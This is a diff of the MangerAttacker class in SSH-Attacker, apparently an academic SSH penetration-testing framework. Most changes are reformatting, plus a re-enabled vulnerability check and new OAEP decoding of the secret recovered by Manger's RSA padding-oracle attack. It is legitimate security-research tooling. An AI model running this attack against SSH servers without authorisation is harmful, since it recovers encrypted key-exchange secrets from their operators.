@@ -1,7 +1,7 @@
 /*
  * SSH-Attacker - A Modular Penetration Testing Framework for SSH
  *
- * Copyright 2014-2021 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
+ * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
  *
  * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
  */
@@ -23,6 +23,7 @@ import de.rub.nds.sshattacker.attacks.pkcs1.MangerWorkflowGenerator;
 import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1Vector;
 import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1VectorGenerator;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
+import de.rub.nds.sshattacker.attacks.pkcs1.util.OaepConverter;
 import de.rub.nds.sshattacker.attacks.response.EqualityError;
 import de.rub.nds.sshattacker.attacks.response.EqualityErrorTranslator;
 import de.rub.nds.sshattacker.attacks.response.FingerPrintChecker;
@@ -35,11 +36,10 @@ import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
 import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
 import de.rub.nds.sshattacker.core.state.State;
 import java.math.BigInteger;
+import java.nio.ByteBuffer;
+import java.security.NoSuchAlgorithmException;
 import java.security.interfaces.RSAPublicKey;
-import java.util.ArrayList;
-import java.util.Collections;
-import java.util.LinkedList;
-import java.util.List;
+import java.util.*;
 import org.apache.logging.log4j.Level;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -103,18 +103,18 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
             if (config.getKexAlgorithm().equals("rsa2048_sha256")) {
                 keyExchangeAlgorithm = KeyExchangeAlgorithm.RSA2048_SHA256;
 
-            } else if(config.getKexAlgorithm().equals("rsa1024_sha1")) {
+            } else if (config.getKexAlgorithm().equals("rsa1024_sha1")) {
                 keyExchangeAlgorithm = KeyExchangeAlgorithm.RSA1024_SHA1;
             } else {
-                throw new ConfigurationException("Unknown key exchange algorithm, did you mistype it? " +
-                        "Options are rsa2048_sha256 and rsa1024_sha1");
+                throw new ConfigurationException(
+                        "Unknown key exchange algorithm, did you mistype it? "
+                                + "Options are rsa2048_sha256 and rsa1024_sha1");
             }
         }
 
         // Set only supported key exchange algorithm to the one specified by the user
         sshConfig.setClientSupportedKeyExchangeAlgorithms(
-                new ArrayList<>(Collections.singleton(keyExchangeAlgorithm))
-        );
+                new ArrayList<>(Collections.singleton(keyExchangeAlgorithm)));
 
         CONSOLE.info("Set key exchange algorithm to: " + keyExchangeAlgorithm);
     }
@@ -178,7 +178,9 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         List<SshTask> taskList = new LinkedList<>();
         List<FingerprintTaskVectorPair> stateVectorPairList = new LinkedList<>();
 
-        for (Pkcs1Vector vector : Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, getHashLength(), getHashInstance())) {
+        for (Pkcs1Vector vector :
+                Pkcs1VectorGenerator.generatePkcs1Vectors(
+                        publicKey, getHashLength(), getHashInstance())) {
 
             State state =
                     new State(
@@ -271,7 +273,7 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         // TODO: make attack work
         if (!isVulnerable()) {
             LOGGER.warn("The server is not vulnerable to Manger's attack");
-            //return;
+            return;
         }
         RSAPublicKey publicKey = getServerPublicKey();
         if (publicKey == null) {
@@ -304,11 +306,26 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         Manger attacker = new Manger(encryptedSecret, oracle);
         attacker.attack();
         BigInteger solution = attacker.getSolution();
-        CONSOLE.info(solution.toString(16));
+        byte[] solutionBytes = solution.toByteArray();
+        ByteBuffer buffer = ByteBuffer.allocate(solutionBytes.length + 1);
+        buffer.put((byte) 0);
+        buffer.put(solutionBytes);
+        try {
+            byte[] decodedMessage =
+                    OaepConverter.doOaepDecoding(
+                            buffer.array(),
+                            getHashInstance(),
+                            publicKey.getModulus().bitLength() / Bits.IN_A_BYTE);
+            CONSOLE.info("Decoded solution: " + new BigInteger(decodedMessage));
+        } catch (NoSuchAlgorithmException e) {
+            e.printStackTrace();
+        }
     }
 
     private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey) {
-        Pkcs1Vector vector = Pkcs1VectorGenerator.generateCorrectFirstBytePkcs1Vector(publicKey, getHashLength(), getHashInstance());
+        Pkcs1Vector vector =
+                Pkcs1VectorGenerator.generateCorrectFirstBytePkcs1Vector(
+                        publicKey, getHashLength(), getHashInstance());
         State state =
                 new State(
                         sshConfig,
